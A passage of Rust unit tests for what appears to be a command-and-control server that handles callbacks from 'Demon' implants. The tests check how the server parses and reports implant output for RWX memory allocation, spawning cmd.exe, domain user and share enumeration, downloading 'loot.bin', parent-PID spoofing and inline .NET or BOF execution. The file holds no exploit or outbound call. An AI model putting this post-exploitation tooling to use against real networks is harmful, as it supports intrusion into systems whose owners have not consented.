        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets, None);

        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonInfoClass::MemAlloc));
        add_u64(&mut payload, 0x1234_5000);
        add_u32(&mut payload, 4096);
        add_u32(&mut payload, 0x40);
        dispatcher.dispatch(0xDEAD_BEEF, u32::from(DemonCommand::DemonInfo), 42, &payload).await?;

        let event = receiver.recv().await.ok_or("mem alloc response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(message.info.extra.get("Type"), Some(&Value::String("Info".to_owned())));
        assert!(
            message
                .info
                .extra
                .get("Message")
                .and_then(Value::as_str)
                .is_some_and(|value| value.contains("Memory Allocated"))
        );
        assert!(
            message
                .info
                .extra
                .get("Message")
                .and_then(Value::as_str)
                .is_some_and(|value| value.contains("PAGE_EXECUTE_READWRITE"))
        );

        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonInfoClass::ProcCreate));
        add_utf16(&mut payload, "C:\\Windows\\System32\\cmd.exe");
        add_u32(&mut payload, 777);
        add_u32(&mut payload, 1);
        add_u32(&mut payload, 1);
        add_u32(&mut payload, 1);
        dispatcher.dispatch(0xDEAD_BEEF, u32::from(DemonCommand::DemonInfo), 43, &payload).await?;

        let event = receiver.recv().await.ok_or("proc create response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert!(message.info.extra.get("Message").and_then(Value::as_str).is_some_and(|value| {
            value.contains("Process started: Path:[C:\\Windows\\System32\\cmd.exe]")
        }));
        Ok(())
    }

    #[tokio::test]
    async fn builtin_command_error_handler_broadcasts_win32_and_token_messages()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher =
            CommandDispatcher::with_builtin_handlers(registry, events, database, sockets, None);

        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonCallbackError::Win32));
        add_u32(&mut payload, 2);
        dispatcher
            .dispatch(0xCAFE_BABE, u32::from(DemonCommand::CommandError), 44, &payload)
            .await?;

        let event = receiver.recv().await.ok_or("win32 error response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(
            message.info.extra.get("Message"),
            Some(&Value::String("Win32 Error: ERROR_FILE_NOT_FOUND [2]".to_owned()))
        );
        assert_eq!(message.info.extra.get("Type"), Some(&Value::String("Error".to_owned())));

        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonCallbackError::Token));
        add_u32(&mut payload, 1);
        dispatcher
            .dispatch(0xCAFE_BABE, u32::from(DemonCommand::CommandError), 45, &payload)
            .await?;

        let event = receiver.recv().await.ok_or("token error response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(
            message.info.extra.get("Message"),
            Some(&Value::String("No tokens inside the token vault".to_owned()))
        );
        Ok(())
    }

    #[tokio::test]
    async fn builtin_job_and_package_dropped_handlers_broadcast_agent_responses()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::new(16);
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let agent =
            sample_agent_info(0xAABB_CCDD, [0x21; AGENT_KEY_LENGTH], [0x43; AGENT_IV_LENGTH]);
        registry.insert(agent).await?;

        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry,
            events.clone(),
            database,
            sockets,
            None,
        );
        let mut receiver = events.subscribe();

        let mut job_payload = Vec::new();
        add_u32(&mut job_payload, u32::from(DemonJobCommand::Resume));
        add_u32(&mut job_payload, 7);
        add_u32(&mut job_payload, 1);
        dispatcher
            .dispatch(0xAABB_CCDD, u32::from(DemonCommand::CommandJob), 30, &job_payload)
            .await?;

        let event = receiver.recv().await.ok_or("job response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(
            message.info.extra.get("Message"),
            Some(&Value::String("Successfully resumed job 7".to_owned()))
        );

        let mut dropped_payload = Vec::new();
        add_u32(&mut dropped_payload, 8192);
        add_u32(&mut dropped_payload, 4096);
        dispatcher
            .dispatch(
                0xAABB_CCDD,
                u32::from(DemonCommand::CommandPackageDropped),
                31,
                &dropped_payload,
            )
            .await?;

        let event = receiver.recv().await.ok_or("package dropped response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(message.info.extra.get("Type"), Some(&Value::String("Error".to_owned())));
        assert_eq!(
            message.info.extra.get("Message"),
            Some(&Value::String(
                "A package was discarded by demon for being larger than PIPE_BUFFER_MAX (8192 > 4096)"
                    .to_owned(),
            ))
        );
        Ok(())
    }

    #[tokio::test]
    async fn builtin_net_and_transfer_handlers_format_operator_output()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::new(16);
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let agent =
            sample_agent_info(0x1122_3344, [0x12; AGENT_KEY_LENGTH], [0x34; AGENT_IV_LENGTH]);
        registry.insert(agent).await?;

        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry.clone(),
            events.clone(),
            database,
            sockets,
            None,
        );
        let mut receiver = events.subscribe();

        let mut open = Vec::new();
        add_u32(&mut open, u32::from(DemonFilesystemCommand::Download));
        add_u32(&mut open, 0);
        add_u32(&mut open, 0x44);
        add_u64(&mut open, 20);
        add_utf16(&mut open, "C:\\loot.bin");
        dispatcher.dispatch(0x1122_3344, u32::from(DemonCommand::CommandFs), 32, &open).await?;
        let _ = receiver.recv().await.ok_or("download progress event missing")?;

        let mut transfer_payload = Vec::new();
        add_u32(&mut transfer_payload, u32::from(DemonTransferCommand::List));
        add_u32(&mut transfer_payload, 0x44);
        add_u32(&mut transfer_payload, 10);
        add_u32(&mut transfer_payload, 1);
        dispatcher
            .dispatch(0x1122_3344, u32::from(DemonCommand::CommandTransfer), 33, &transfer_payload)
            .await?;

        let event = receiver.recv().await.ok_or("transfer response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(
            message.info.extra.get("Message"),
            Some(&Value::String("List downloads [1 current downloads]:".to_owned()))
        );
        assert!(message.info.output.contains("loot.bin"));
        assert!(message.info.output.contains("50.00%"));

        let mut net_payload = Vec::new();
        add_u32(&mut net_payload, u32::from(DemonNetCommand::Users));
        add_utf16(&mut net_payload, "WKSTN-01");
        add_utf16(&mut net_payload, "alice");
        add_u32(&mut net_payload, 1);
        add_utf16(&mut net_payload, "bob");
        add_u32(&mut net_payload, 0);
        dispatcher
            .dispatch(0x1122_3344, u32::from(DemonCommand::CommandNet), 34, &net_payload)
            .await?;

        let event = receiver.recv().await.ok_or("net response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(
            message.info.extra.get("Message"),
            Some(&Value::String("Users on WKSTN-01: ".to_owned()))
        );
        assert!(message.info.output.contains("alice (Admin)"));
        assert!(message.info.output.contains("bob"));
        Ok(())
    }

    #[tokio::test]
    async fn net_sessions_two_rows_produces_formatted_table()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::new(16);
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let agent =
            sample_agent_info(0x1122_3344, [0x12; AGENT_KEY_LENGTH], [0x34; AGENT_IV_LENGTH]);
        registry.insert(agent).await?;

        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry.clone(),
            events.clone(),
            database,
            sockets,
            None,
        );
        let mut receiver = events.subscribe();

        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonNetCommand::Sessions));
        add_utf16(&mut payload, "SRV-01");
        // Row 1
        add_utf16(&mut payload, "10.0.0.1");
        add_utf16(&mut payload, "alice");
        add_u32(&mut payload, 120);
        add_u32(&mut payload, 5);
        // Row 2
        add_utf16(&mut payload, "10.0.0.2");
        add_utf16(&mut payload, "bob");
        add_u32(&mut payload, 300);
        add_u32(&mut payload, 0);

        dispatcher.dispatch(0x1122_3344, u32::from(DemonCommand::CommandNet), 50, &payload).await?;

        let event = receiver.recv().await.ok_or("net sessions response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(
            message.info.extra.get("Message"),
            Some(&Value::String("Sessions for SRV-01 [2]: ".to_owned()))
        );
        let output = &message.info.output;
        assert!(output.contains("10.0.0.1"), "output should contain first client");
        assert!(output.contains("alice"), "output should contain first user");
        assert!(output.contains("10.0.0.2"), "output should contain second client");
        assert!(output.contains("bob"), "output should contain second user");
        assert!(output.contains("Computer"), "output should contain header");
        Ok(())
    }

    #[tokio::test]
    async fn net_share_one_row_contains_name_and_path() -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::new(16);
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let agent =
            sample_agent_info(0x1122_3344, [0x12; AGENT_KEY_LENGTH], [0x34; AGENT_IV_LENGTH]);
        registry.insert(agent).await?;

        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry.clone(),
            events.clone(),
            database,
            sockets,
            None,
        );
        let mut receiver = events.subscribe();

        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonNetCommand::Share));
        add_utf16(&mut payload, "FILE-SRV");
        // One share row
        add_utf16(&mut payload, "ADMIN$");
        add_utf16(&mut payload, "C:\\Windows");
        add_utf16(&mut payload, "Remote Admin");
        add_u32(&mut payload, 0);

        dispatcher.dispatch(0x1122_3344, u32::from(DemonCommand::CommandNet), 51, &payload).await?;

        let event = receiver.recv().await.ok_or("net share response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(
            message.info.extra.get("Message"),
            Some(&Value::String("Shares for FILE-SRV [1]: ".to_owned()))
        );
        let output = &message.info.output;
        assert!(output.contains("ADMIN$"), "output should contain share name");
        assert!(output.contains("C:\\Windows"), "output should contain share path");
        assert!(output.contains("Remote Admin"), "output should contain remark");
        Ok(())
    }

    #[tokio::test]
    async fn net_logons_lists_each_username() -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::new(16);
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let agent =
            sample_agent_info(0x1122_3344, [0x12; AGENT_KEY_LENGTH], [0x34; AGENT_IV_LENGTH]);
        registry.insert(agent).await?;

        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry.clone(),
            events.clone(),
            database,
            sockets,
            None,
        );
        let mut receiver = events.subscribe();

        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonNetCommand::Logons));
        add_utf16(&mut payload, "DC-01");
        add_utf16(&mut payload, "administrator");
        add_utf16(&mut payload, "svc_backup");
        add_utf16(&mut payload, "jdoe");

        dispatcher.dispatch(0x1122_3344, u32::from(DemonCommand::CommandNet), 52, &payload).await?;

        let event = receiver.recv().await.ok_or("net logons response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(
            message.info.extra.get("Message"),
            Some(&Value::String("Logged on users at DC-01 [3]: ".to_owned()))
        );
        let output = &message.info.output;
        assert!(output.contains("administrator"), "output should list first user");
        assert!(output.contains("svc_backup"), "output should list second user");
        assert!(output.contains("jdoe"), "output should list third user");
        assert!(output.contains("Usernames"), "output should contain header");
        Ok(())
    }

    #[tokio::test]
    async fn net_group_two_rows_contains_both_names() -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::new(16);
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let agent =
            sample_agent_info(0x1122_3344, [0x12; AGENT_KEY_LENGTH], [0x34; AGENT_IV_LENGTH]);
        registry.insert(agent).await?;

        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry.clone(),
            events.clone(),
            database,
            sockets,
            None,
        );
        let mut receiver = events.subscribe();

        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonNetCommand::Group));
        add_utf16(&mut payload, "CORP-DC");
        add_utf16(&mut payload, "Domain Admins");
        add_utf16(&mut payload, "Designated administrators of the domain");
        add_utf16(&mut payload, "Domain Users");
        add_utf16(&mut payload, "All domain users");

        dispatcher.dispatch(0x1122_3344, u32::from(DemonCommand::CommandNet), 53, &payload).await?;

        let event = receiver.recv().await.ok_or("net group response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(
            message.info.extra.get("Message"),
            Some(&Value::String("List groups on CORP-DC: ".to_owned()))
        );
        let output = &message.info.output;
        assert!(output.contains("Domain Admins"), "output should contain first group");
        assert!(output.contains("Domain Users"), "output should contain second group");
        Ok(())
    }

    #[tokio::test]
    async fn net_localgroup_two_rows_contains_both_names() -> Result<(), Box<dyn std::error::Error>>
    {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::new(16);
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let agent =
            sample_agent_info(0x1122_3344, [0x12; AGENT_KEY_LENGTH], [0x34; AGENT_IV_LENGTH]);
        registry.insert(agent).await?;

        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry.clone(),
            events.clone(),
            database,
            sockets,
            None,
        );
        let mut receiver = events.subscribe();

        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonNetCommand::LocalGroup));
        add_utf16(&mut payload, "WKSTN-05");
        add_utf16(&mut payload, "Administrators");
        add_utf16(&mut payload, "Full system access");
        add_utf16(&mut payload, "Remote Desktop Users");
        add_utf16(&mut payload, "Can log on remotely");

        dispatcher.dispatch(0x1122_3344, u32::from(DemonCommand::CommandNet), 54, &payload).await?;

        let event = receiver.recv().await.ok_or("net localgroup response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(
            message.info.extra.get("Message"),
            Some(&Value::String("Local Groups for WKSTN-05: ".to_owned()))
        );
        let output = &message.info.output;
        assert!(output.contains("Administrators"), "output should contain first group");
        assert!(output.contains("Remote Desktop Users"), "output should contain second group");
        Ok(())
    }

    #[tokio::test]
    async fn net_domain_nonempty_reports_domain_name() -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::new(16);
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let agent =
            sample_agent_info(0x1122_3344, [0x12; AGENT_KEY_LENGTH], [0x34; AGENT_IV_LENGTH]);
        registry.insert(agent).await?;

        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry.clone(),
            events.clone(),
            database,
            sockets,
            None,
        );
        let mut receiver = events.subscribe();

        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonNetCommand::Domain));
        // read_string uses read_bytes (length-prefixed UTF-8)
        add_bytes(&mut payload, b"CORP.LOCAL\0");

        dispatcher.dispatch(0x1122_3344, u32::from(DemonCommand::CommandNet), 55, &payload).await?;

        let event = receiver.recv().await.ok_or("net domain response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(
            message.info.extra.get("Message"),
            Some(&Value::String("Domain for this Host: CORP.LOCAL".to_owned()))
        );
        Ok(())
    }

    #[tokio::test]
    async fn net_domain_empty_reports_not_joined() -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::new(16);
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let agent =
            sample_agent_info(0x1122_3344, [0x12; AGENT_KEY_LENGTH], [0x34; AGENT_IV_LENGTH]);
        registry.insert(agent).await?;

        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry.clone(),
            events.clone(),
            database,
            sockets,
            None,
        );
        let mut receiver = events.subscribe();

        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonNetCommand::Domain));
        // Empty string: just a null terminator (read_string trims trailing \0)
        add_bytes(&mut payload, b"\0");

        dispatcher.dispatch(0x1122_3344, u32::from(DemonCommand::CommandNet), 56, &payload).await?;

        let event = receiver.recv().await.ok_or("net domain empty response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(
            message.info.extra.get("Message"),
            Some(&Value::String("The machine does not seem to be joined to a domain".to_owned()))
        );
        Ok(())
    }

    #[tokio::test]
    async fn net_computer_returns_none() -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::new(16);
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let agent =
            sample_agent_info(0x1122_3344, [0x12; AGENT_KEY_LENGTH], [0x34; AGENT_IV_LENGTH]);
        registry.insert(agent).await?;

        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry.clone(),
            events.clone(),
            database,
            sockets,
            None,
        );
        let mut receiver = events.subscribe();

        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonNetCommand::Computer));

        let result = dispatcher
            .dispatch(0x1122_3344, u32::from(DemonCommand::CommandNet), 57, &payload)
            .await?;
        assert!(result.is_none(), "Computer subcommand should return None");

        // No event should have been broadcast
        let recv = timeout(Duration::from_millis(50), receiver.recv()).await;
        assert!(recv.is_err(), "no event should be broadcast for Computer subcommand");
        Ok(())
    }

    #[tokio::test]
    async fn net_dclist_returns_none() -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::new(16);
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let agent =
            sample_agent_info(0x1122_3344, [0x12; AGENT_KEY_LENGTH], [0x34; AGENT_IV_LENGTH]);
        registry.insert(agent).await?;

        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry.clone(),
            events.clone(),
            database,
            sockets,
            None,
        );
        let mut receiver = events.subscribe();

        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonNetCommand::DcList));

        let result = dispatcher
            .dispatch(0x1122_3344, u32::from(DemonCommand::CommandNet), 58, &payload)
            .await?;
        assert!(result.is_none(), "DcList subcommand should return None");

        let recv = timeout(Duration::from_millis(50), receiver.recv()).await;
        assert!(recv.is_err(), "no event should be broadcast for DcList subcommand");
        Ok(())
    }

    #[tokio::test]
    async fn builtin_config_and_mem_file_handlers_update_agent_state_and_broadcast()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::new(16);
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let agent =
            sample_agent_info(0x5566_7788, [0x56; AGENT_KEY_LENGTH], [0x78; AGENT_IV_LENGTH]);
        registry.insert(agent).await?;

        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry.clone(),
            events.clone(),
            database,
            sockets,
            None,
        );
        let mut receiver = events.subscribe();

        let mut config_payload = Vec::new();
        add_u32(&mut config_payload, u32::from(DemonConfigKey::WorkingHours));
        add_u32(&mut config_payload, 0b101010);
        dispatcher
            .dispatch(0x5566_7788, u32::from(DemonCommand::CommandConfig), 35, &config_payload)
            .await?;

        let event = receiver.recv().await.ok_or("agent update missing")?;
        let OperatorMessage::AgentUpdate(_) = event else {
            panic!("expected agent update event");
        };
        let event = receiver.recv().await.ok_or("config response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(
            message.info.extra.get("Message"),
            Some(&Value::String("WorkingHours has been set".to_owned()))
        );
        assert_eq!(
            registry.get(0x5566_7788).await.and_then(|agent| agent.working_hours),
            Some(0b101010)
        );

        let mut mem_file_payload = Vec::new();
        add_u32(&mut mem_file_payload, 0xAB);
        add_u32(&mut mem_file_payload, 1);
        dispatcher
            .dispatch(0x5566_7788, u32::from(DemonCommand::CommandMemFile), 36, &mem_file_payload)
            .await?;

        let event = receiver.recv().await.ok_or("mem file response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(
            message.info.extra.get("Message"),
            Some(&Value::String("Memory file ab registered successfully".to_owned()))
        );
        Ok(())
    }

    #[tokio::test]
    async fn builtin_config_handler_preserves_high_bit_working_hours()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::new(16);
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let agent =
            sample_agent_info(0x5566_7799, [0x56; AGENT_KEY_LENGTH], [0x78; AGENT_IV_LENGTH]);
        registry.insert(agent).await?;

        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry.clone(),
            events.clone(),
            database.clone(),
            sockets,
            None,
        );
        let mut receiver = events.subscribe();
        let working_hours = 0x8000_002A;

        let mut config_payload = Vec::new();
        add_u32(&mut config_payload, u32::from(DemonConfigKey::WorkingHours));
        add_u32(&mut config_payload, working_hours);
        dispatcher
            .dispatch(0x5566_7799, u32::from(DemonCommand::CommandConfig), 37, &config_payload)
            .await?;

        let event = receiver.recv().await.ok_or("agent update missing")?;
        let OperatorMessage::AgentUpdate(_) = event else {
            panic!("expected agent update event");
        };
        let event = receiver.recv().await.ok_or("config response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(
            message.info.extra.get("Message"),
            Some(&Value::String("WorkingHours has been set".to_owned()))
        );
        let expected = Some(i32::from_be_bytes(working_hours.to_be_bytes()));
        assert_eq!(registry.get(0x5566_7799).await.and_then(|agent| agent.working_hours), expected);

        let persisted = database
            .agents()
            .get(0x5566_7799)
            .await?
            .ok_or_else(|| "agent should be persisted after config update".to_owned())?;
        assert_eq!(persisted.working_hours, expected);
        Ok(())
    }

    #[tokio::test]
    async fn builtin_config_handler_rejects_kill_date_exceeding_i64_range()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::new(16);
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let agent =
            sample_agent_info(0x5566_7800, [0x56; AGENT_KEY_LENGTH], [0x78; AGENT_IV_LENGTH]);
        registry.insert(agent).await?;

        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry.clone(),
            events.clone(),
            database.clone(),
            sockets,
            None,
        );
        let mut receiver = events.subscribe();

        let mut config_payload = Vec::new();
        add_u32(&mut config_payload, u32::from(DemonConfigKey::KillDate));
        add_u64(&mut config_payload, i64::MAX as u64 + 1);
        let error = dispatcher
            .dispatch(0x5566_7800, u32::from(DemonCommand::CommandConfig), 38, &config_payload)
            .await
            .expect_err("overflowing kill date config must be rejected");

        assert!(matches!(
            error,
            CommandDispatchError::InvalidCallbackPayload { command_id, ref message }
                if command_id == u32::from(DemonCommand::CommandConfig)
                    && message == "config kill date exceeds i64 range"
        ));
        assert_eq!(registry.get(0x5566_7800).await.and_then(|agent| agent.kill_date), None);
        let persisted =
            database.agents().get(0x5566_7800).await?.ok_or_else(|| {
                "agent should still exist after rejected config update".to_owned()
            })?;
        assert_eq!(persisted.kill_date, None);
        assert!(
            timeout(Duration::from_millis(50), receiver.recv()).await.is_err(),
            "rejected config update should not broadcast events"
        );
        Ok(())
    }

    #[tokio::test]
    async fn builtin_sleep_ppid_and_assembly_handlers_update_state_and_broadcast()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::new(16);
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let agent =
            sample_agent_info(0xCAFEBABE, [0x66; AGENT_KEY_LENGTH], [0x77; AGENT_IV_LENGTH]);
        registry.insert(agent).await?;

        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry.clone(),
            events.clone(),
            database,
            sockets,
            None,
        );
        let mut receiver = events.subscribe();

        let mut sleep_payload = Vec::new();
        add_u32(&mut sleep_payload, 60);
        add_u32(&mut sleep_payload, 15);
        dispatcher
            .dispatch(0xCAFEBABE, u32::from(DemonCommand::CommandSleep), 37, &sleep_payload)
            .await?;

        let event = receiver.recv().await.ok_or("sleep agent update missing")?;
        let OperatorMessage::AgentUpdate(_) = event else {
            panic!("expected agent update event");
        };
        let event = receiver.recv().await.ok_or("sleep response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(
            message.info.extra.get("Message"),
            Some(&Value::String("Set sleep interval to 60 seconds with 15% jitter".to_owned()))
        );
        let updated = registry.get(0xCAFEBABE).await.ok_or("missing updated agent")?;
        assert_eq!(updated.sleep_delay, 60);
        assert_eq!(updated.sleep_jitter, 15);

        let mut ppid_payload = Vec::new();
        add_u32(&mut ppid_payload, 4242);
        dispatcher
            .dispatch(0xCAFEBABE, u32::from(DemonCommand::CommandProcPpidSpoof), 38, &ppid_payload)
            .await?;

        let event = receiver.recv().await.ok_or("ppid agent update missing")?;
        let OperatorMessage::AgentUpdate(_) = event else {
            panic!("expected agent update event");
        };
        let event = receiver.recv().await.ok_or("ppid response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(
            message.info.extra.get("Message"),
            Some(&Value::String("Changed parent pid to spoof: 4242".to_owned()))
        );
        assert_eq!(
            registry.get(0xCAFEBABE).await.ok_or("missing updated agent")?.process_ppid,
            4242
        );

        let mut assembly_payload = Vec::new();
        add_u32(&mut assembly_payload, 0x2);
        add_utf16(&mut assembly_payload, "v4.0.30319");
        dispatcher
            .dispatch(
                0xCAFEBABE,
                u32::from(DemonCommand::CommandAssemblyInlineExecute),
                39,
                &assembly_payload,
            )
            .await?;

        let event = receiver.recv().await.ok_or("assembly response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(
            message.info.extra.get("Message"),
            Some(&Value::String("Using CLR Version: v4.0.30319".to_owned()))
        );

        let mut versions_payload = Vec::new();
        add_utf16(&mut versions_payload, "v2.0.50727");
        add_utf16(&mut versions_payload, "v4.0.30319");
        dispatcher
            .dispatch(
                0xCAFEBABE,
                u32::from(DemonCommand::CommandAssemblyListVersions),
                40,
                &versions_payload,
            )
            .await?;

        let event = receiver.recv().await.ok_or("assembly versions response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(
            message.info.extra.get("Message"),
            Some(&Value::String("List available assembly versions:".to_owned()))
        );
        assert!(message.info.output.contains("v2.0.50727"));
        assert!(message.info.output.contains("v4.0.30319"));
        Ok(())
    }

    #[tokio::test]
    async fn inline_execute_bof_output_broadcasts_agent_response()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::new(16);
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let agent =
            sample_agent_info(0xB0B1B2B3, [0x11; AGENT_KEY_LENGTH], [0x22; AGENT_IV_LENGTH]);
        registry.insert(agent).await?;

        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry.clone(),
            events.clone(),
            database,
            sockets,
            None,
        );
        let mut receiver = events.subscribe();

        // BOF_CALLBACK_OUTPUT (0x00): standard output from the BOF
        let mut payload = Vec::new();
        add_u32(&mut payload, 0x00);
        add_bytes(&mut payload, b"hello from BOF");
        dispatcher
            .dispatch(0xB0B1B2B3, u32::from(DemonCommand::CommandInlineExecute), 1, &payload)
            .await?;
        let event = receiver.recv().await.ok_or("bof output response missing")?;
        let OperatorMessage::AgentResponse(message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(message.info.extra.get("Type"), Some(&Value::String("Output".to_owned())));
        assert_eq!(
            message.info.extra.get("Message"),
            Some(&Value::String("hello from BOF".to_owned()))
        );

        // BOF_RAN_OK (3): completion confirmation
        let mut ran_ok = Vec::new();
        add_u32(&mut ran_ok, 3);
        dispatcher
            .dispatch(0xB0B1B2B3, u32::from(DemonCommand::CommandInlineExecute), 2, &ran_ok)
            .await?;
        let event = receiver.recv().await.ok_or("bof ran-ok response missing")?;
        let OperatorMessage::AgentResponse(ok_message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(
            ok_message.info.extra.get("Message"),
            Some(&Value::String("BOF execution completed".to_owned()))
        );

        // BOF_EXCEPTION (1): exception code + address
        let mut exc = Vec::new();
        add_u32(&mut exc, 1);
        add_u32(&mut exc, 0xC000_0005_u32); // STATUS_ACCESS_VIOLATION
        add_u64(&mut exc, 0x0000_7FF7_DEAD_BEEF_u64);
        dispatcher
            .dispatch(0xB0B1B2B3, u32::from(DemonCommand::CommandInlineExecute), 3, &exc)
            .await?;
        let event = receiver.recv().await.ok_or("bof exception response missing")?;
        let OperatorMessage::AgentResponse(exc_message) = event else {
            panic!("expected agent response event");
        };
        assert!(
            exc_message
                .info
                .extra
                .get("Message")
